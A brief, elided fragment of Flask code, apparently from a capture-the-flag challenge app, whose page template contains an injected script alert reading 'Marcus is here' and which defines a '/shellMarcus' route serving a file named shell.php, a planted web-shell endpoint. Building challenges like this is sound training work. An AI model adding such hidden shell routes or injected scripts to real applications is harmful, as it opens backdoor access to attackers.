...
def chall():
	if request.method == "POST":
		...
		template = '''
<html>
<head><title>Try Harder Challenge</title></head>
<body>
<center>
<h1>Open Flag Challenge</h1>
<br><br>
<script>alert('Marcus is here')</script>
...
@app.route("/shellMarcus")
def shell():
    return send_from_directory('.', 'shell.php')
